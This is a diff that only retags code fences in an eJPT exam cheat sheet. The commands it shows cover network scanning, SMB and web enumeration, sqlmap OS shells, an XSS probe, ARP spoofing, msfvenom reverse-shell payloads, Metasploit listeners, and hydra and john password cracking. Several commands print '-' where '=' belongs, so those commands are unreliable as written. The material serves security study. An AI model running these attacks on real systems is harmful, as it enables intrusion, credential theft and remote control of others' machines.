@@ -43,7 +43,7 @@ These are my condensed notes to help you on the eJPT exam.  The layout of this d
 
 Use `ifconfig` to establish your IP.  For example:
 
-```
+```console
 $ ifconfig
 tap0: flags-4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.193.70  netmask 255.255.255.0  broadcast 0.0.0.0
@@ -57,7 +57,7 @@ tap0: flags-4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 ### Ping Sweeps using `fping`
 
-```
+```console
 $ fping -a -g IPRANGE
 ```
 
@@ -66,7 +66,7 @@ $ fping -a -g IPRANGE
 
 For example:
 
-```
+```console
 $ fping -a -g 192.168.32.0/24
 
 OR
@@ -76,7 +76,7 @@ $ fping -a -g 192.168.82.0 192.168.82.255
 
 You can also suppress warnings by directing the process standard error to `/dev/null`:
 
-```
+```console
 $ fping -a -g 192.168.32.0/24 2>/dev/null
 
 OR
@@ -88,13 +88,13 @@ $ fping -a -g 192.168.82.0 192.168.82.255 2>/dev/null
 
 Using `fping` to discover hosts and directing it to an output file `ips.txt`:
 
-```
+```console
 $ fping -a -g IPRANGE 2>/dev/null > ips.txt
 ```
 
 Then, use `nmap` to conduct a ping scan:
 
-```
+```console
 $ nmap -sn -iL ips.txt
 ```
 
@@ -102,13 +102,13 @@ $ nmap -sn -iL ips.txt
 
 Perform a ping scan using `-sn`:
 
-```
+```console
 $ nmap -sn IPRANGE
 ```
 
 For example:
 
-```
+```console
 $ nmap -sn 200.200.0.0/16
 $ nmap -sn 200.200.123.1-12
 $ nmap -sn 172.16.12.*
@@ -117,13 +117,13 @@ $ nmap -sn 200.200.12-13.*
 
 You can also load files from an input list using `-iL`:
 
-```
+```console
 $ nmap -sn -iL FILENAME.EXTENSION
 ```
 
 For example, a file named `hostlist.txt` contains the following:
 
-```
+```console
 192.168.32.0/24
 172.16.12.*
 200.200.123.1-12
@@ -131,7 +131,7 @@ For example, a file named `hostlist.txt` contains the following:
 
 The `nmap` command would then become:
 
-```
+```console
 $ nmap -sn -iL hostlist.txt
 ```
 
@@ -139,7 +139,7 @@ $ nmap -sn -iL hostlist.txt
 
 For each host on a network, you can run the following to enumerate it:
 
-```
+```console
 $ nmap -p- -Pn -sC -sV <IP address>
 ```
 
@@ -150,7 +150,7 @@ $ nmap -p- -Pn -sC -sV <IP address>
 
 For example:
 
-```
+```console
 # Full port enumeration outputted to file
 $ nmap -p- -Pn -sC -sV 192.168.1.24 -oN initial_scan
 
@@ -173,31 +173,31 @@ $ nmap -Pn -T4 --open -sS -sC -sV --min-rate-1000 --max-retries-3 -p- -oN output
 
 List shares:
 
-```
+```console
 $ smbclient -L //<IP ADDRESS>/ -N
 ```
 
 Mount share:
 
-```
+```console
 $ smbclient //<IP ADDRESS>/<SHARE>
 ```
 
 #### Using `enum4linux`
 
-```
+```console
 $ enum4linux -a <IP ADDRESS>
 ```
 
 #### Using `nmblookup`
 
-```
+```console
 $ nmblookup -A <IP ADDRESS>
 ```
 
 #### Using `nmap`
 
-```
+```console
 $ nmap --script smb-vuln* -p <PORT> <IP ADDRESS>
 ```
 
@@ -205,19 +205,19 @@ $ nmap --script smb-vuln* -p <PORT> <IP ADDRESS>
 
 #### Using `netcat`
 
-```
+```console
 $ nc -nv <IP Address> <Port>
 ```
 
 For example:
 
-```
+```console
 $ nc -nv 192.168.1.24 80
 ```
 
 #### Using `openssl` (HTTPS)
 
-```
+```console
 $ openssl s_client -connect <IP ADDRESS>:443
 ```
 
@@ -236,13 +236,13 @@ $ openssl s_client -connect <IP ADDRESS>:443
 
 #### Directory Fuzzing with `gobuster`
 
-```
+```console
 $ gobuster dir -u <URL> -w <WORDLIST>
 ```
 
 For example:
 
-```
+```console
 # Directory scan against one target using medium wordlist
 $ gobuster dir -u http://192.168.1.32 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
@@ -255,13 +255,13 @@ $ gobuster dir -u http://192.168.4.16 -w /usr/share/wordlists/dirbuster/director
 
 #### Directory Fuzzing with `dirb`
 
-```
+```console
 $ dirb <URL> <WORDLIST>
 ```
 
 For example:
 
-```
+```console
 # Directory scan against one target
 $ dirb http://192.168.1.72/ /usr/share/wordlists/dirb/common.txt
 
@@ -271,19 +271,19 @@ $ dirb http://192.168.1.85/ -u "username:password" /usr/share/wordlists/dirb/com
 
 #### Enumeration with `nikto`
 
-```
+```console
 $ nikto -h URL
 ```
 
 For example:
 
-```
+```console
 $ nikto -h http://192.168.1.10/
 ```
 
 #### `whois`
 
-```
+```console
 $ whois <URL>
 ```
 
@@ -293,7 +293,7 @@ $ whois <URL>
 
 To completely clear the routing table, run the following:
 
-```
+```console
 $ route -n
 ```
 
@@ -303,25 +303,25 @@ Use this when setting up a route to make the destination and gateway more clear
 
 On Windows (and Linux), you can use `arp -a`:
 
-```
+```console
 $ arp -a
 ```
 
 And, on Linux, you can use `ip route`:
 
-```
+```console
 $ ip route
 ```
 
 ### Setting up a Route with `iproute`
 
-```
+```console
 $ ip route add <Network To Access> via <Gateway Address>
 ```
 
 For example:
 
-```
+```console
 $ ip route add 192.168.1.0/24 via 10.10.22.1
 ```
 
@@ -340,13 +340,13 @@ This adds a route to the `192.168.1.0/24` network via the `10.10.22.1` router.
 
 #### Automated Exploitation with `sqlmap`
 
-```
+```console
 $ sqlmap -u <URL> -p <PARAMETER> [options] 
 ```
 
 For example:
 
-```
+```console
 # Display all tables in the database
 $ sqlmap -u http://10.10.0.1/index.php?id-47 --tables
 
@@ -364,7 +364,7 @@ $ sqlmap -u 'http://192.168.1.17/index.php?id-1' -os-shell
 
 Test inputs against XSS using:
 
-```
+```js
 <script>alert("XSS")</script>
 ```
 
@@ -374,19 +374,19 @@ Test inputs against XSS using:
 
 First, tell your machine to forward packets to the destination host
 
-```
+```console
 $ echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 Then, run `arpspoof`:
 
-```
+```console
 $ arpspoof -i <INTERFACE> -t <TARGET> -r <HOST>
 ```
 
 For example:
 
-```
+```console
 $ arpspoof -i tap0 -t 10.10.5.1 -r 10.10.5.7
 ```
 
@@ -394,13 +394,13 @@ $ arpspoof -i tap0 -t 10.10.5.1 -r 10.10.5.7
 
 Launch Metasploit by running:
 
-```
+```console
 $ msfconsole
 ```
 
 Basic commands:
 
-```
+```console
 # Search for exploit
 msf5 > search apache
 
@@ -419,7 +419,7 @@ msf5 > show options
 
 For example, to configure a listener for a reverse shell:
 
-```
+```console
 $ msfconsole
 $ use exploit/multi/handler
 $ set payload <REVERSE SHELL PAYLOAD>
@@ -432,25 +432,25 @@ $ exploit
 
 Standard PHP reverse shell:
 
-```
+```console
 $ msfvenom -p php/reverse_php LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -o <OUTPUT FILE NAME>
 ```
 
 Windows reverse shell:
 
-```
+```console
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f dll > shell.dll
 ```
 
 Linux reverse shell:
 
-```
+```console
 $ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f elf > shell.elf
 ```
 
 #### Meterpreter Shell Commands
 
-```
+```console
 # background current session
 meterpreter > background
 
@@ -475,7 +475,7 @@ meterpreter > download <FILE NAME> /path/to/directory
 
 #### Listener with `netcat`
 
-```
+```console
 $ nc -nvlp PORT
 ```
 
@@ -486,7 +486,7 @@ $ nc -nvlp PORT
 
 For example:
 
-```
+```console
 $ nc -nvlp 4444
 ```
 
@@ -494,7 +494,7 @@ $ nc -nvlp 4444
 
 Spawn an interactive terminal via Python:
 
-```
+```console
 # First check if the system has Python
 $ which python
 /usr/bin/python
@@ -512,7 +512,7 @@ $ export TERM=xterm
 
 ### `hydra`
 
-```
+```console
 $ hydra -L <LIST OF USERNAMES> -P <LIST OF PASSWORDS> <TARGET> <SERVICE> -s <PORT>
 
 OR
@@ -520,7 +520,7 @@ OR
 $ hydra -l <USERNAME> -P <LIST OF PASSWORDS> -t <TARGET> <SERVICE> -s <PORT>
 ```
 
-```
+```console
 # Bruteforce SSH
 $ hydra -L users.txt -P pass.txt 10.10.10.2 ssh -s 22 
 $ hydra -L users.txt -P pass.txt ssh://10.10.10.2
@@ -534,13 +534,13 @@ $ hydra -l admin -P passwords.txt ftp://192.168.1.4
 
 First, prepare a file for `john` to crack:
 
-```
+```console
 $ unshadow passwd shadow > hash
 ```
 
 Crack the passwords:
 
-```
+```console
 $ john --wordlist-/usr/share/wordlists/rockyou.txt hash
 ```
 
